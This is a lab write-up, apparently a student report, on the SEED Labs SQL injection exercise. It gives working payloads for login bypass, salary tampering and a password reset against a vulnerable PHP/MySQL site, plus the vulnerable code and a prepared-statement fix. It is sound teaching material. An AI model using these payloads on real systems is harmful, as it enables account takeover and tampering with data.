# SEEDLABS SQL Injection Lab

In this lab there is a web application which is vulnerable to SQLi connected to a MySQL database. It is a simple _Employee management_ site which displays employee info upon login and allows users to modify their personal information (nickname, address, password - and more).

## SQL Injection on SELECT Statements

### SQL Injection Attack from the Web Page

The first activity performed on the vulnerable website is logging in as the `admin` user.
To do so, the following input is provided:

```
admin' -- 
```

This value is entered as the **username**, while any value can be entered as the **password**.
The injected SQL comment (`--`) causes the password check to be ignored, successfully authenticating the attacker as `admin` and displaying the list of all employees. This can be seen by observing the PHP code that performs the query:

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password 
FROM credential WHERE name='$name' and Password='$hashed_pwd'";
```

which becomes, with the provided input:
```sql
SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password  FROM credential WHERE name='admin' -- and Password='something silly'
```

In the following tasks the result of the prompt will approximately be the same.

---

### SQL Injection Attack from the Command Line

The same attack can be executed from the command line using the following command:

```bash
curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20--%20Password=ciao'
```

In this request, the single quote (`'`) and space characters are URL‑encoded as `%27` and `%20`, respectively.
Upon execution, the server returns the HTML content of the page, confirming that the injection is successful even when performed outside a web browser.

---

### Appending a New SQL Statement

The next task attempts to append a second SQL statement to the original query.
This is done by using the semicolon (`;`) character to place multiple SQL statements on the same line.

However, the attack fails because the backend database is **MySQL**, which **disables query piggybacking by default**. As a result, multiple SQL statements cannot be executed within a single query.

---

## SQL Injection Attacks on UPDATE Statements

### Modifying Your Own Salary

The next objective is to modify the salary of a user, such as **Alice**.
From the *Edit Profile* section, the user is allowed to modify only limited fields (Nickname, Email, Address, Phone Number, and Password).

To update the salary field, a SQL injection payload is used:

```
alix', salary='999999
```

After submitting this input, the salary displayed on the user's home page is updated accordingly. This happens because the PHP code in the backend simply puts the parameters taken from the URL into the SQL query that becomes:

```SQL
UPDATE credential SET
nickname='alix', salary='999999'
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber='$input_phonenumber'
WHERE ID=$id;
```

---

### Modifying Boby's Salary

The following task involves modifying the salary of another user, **Boby**.
A similar SQL injection technique is used:

```
', salary='1' WHERE name='Boby'-- 
```

This injection successfully updates Boby's salary, demonstrating that arbitrary user records can be modified. In the code the comment removes what comes next:
```SQL
UPDATE credential SET
nickname='', salary='1' WHERE name='Boby'-- email='$input_email', address='$input_address', Password='$hashed_pwd', PhoneNumber='$input_phonenumber' WHERE ID=$id;
```

---

### Modifying Boby's Password

The final attack modifies Boby's password.
Since the database stores passwords as **SHA‑1 hashes**, the injected query must apply the same hashing function:

```
', Password=SHA1('supersecretpasswordhahahahahaha') WHERE name='Boby'-- 
```

After this injection, the attacker can log in using the chosen password, effectively taking control of Boby's account.

---

## Countermeasures – Prepared Statements

The final task secures the login functionality using **prepared statements**, which prevent SQL injection attacks by separating SQL logic from user input.

The original vulnerable code in `unsafe.php` is shown below:

```php
<?php
// Function to create a sql connection.
function getDB() {
  $dbhost="10.9.0.6";
  $dbuser="seed";
  $dbpass="dees";
  $dbname="sqllab_users";

  // Create a DB connection
  $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error . "\n");
  }
  return $conn;
}

$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

// create a connection
$conn = getDB();

// do the query
$result = $conn->query("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name= '$input_uname' and Password= '$hashed_pwd'");

if ($result->num_rows > 0) {
  // only take the first row 
  $firstrow = $result->fetch_assoc();
  $id     = $firstrow["id"];
  $name   = $firstrow["name"];
  $eid    = $firstrow["eid"];
  $salary = $firstrow["salary"];
  $ssn    = $firstrow["ssn"];
}

// close the sql connection
$conn->close();
?>
```

This code is vulnerable because user‑supplied parameters are directly concatenated into the SQL query.

To mitigate this issue, the `$result` query can be replaced with the following **prepared statement**:

```php
$stmt = $conn->prepare(
  "SELECT id, name, eid, salary, ssn FROM credential WHERE name = ? AND Password = ?"
);
$stmt->bind_param("ss", $input_uname, $hashed_pwd);
```

Here, the variables `$input_uname` and `$hashed_pwd` are safely bound to the SQL statement.

The statement can then be executed as follows:

```php
$stmt->execute();
$stmt->bind_result($id, $name, $eid, $salary, $ssn);
$stmt->fetch();
```

By using prepared statements, user input is treated strictly as data, eliminating the risk of SQL injection attacks even when parameters are extracted directly from the URL.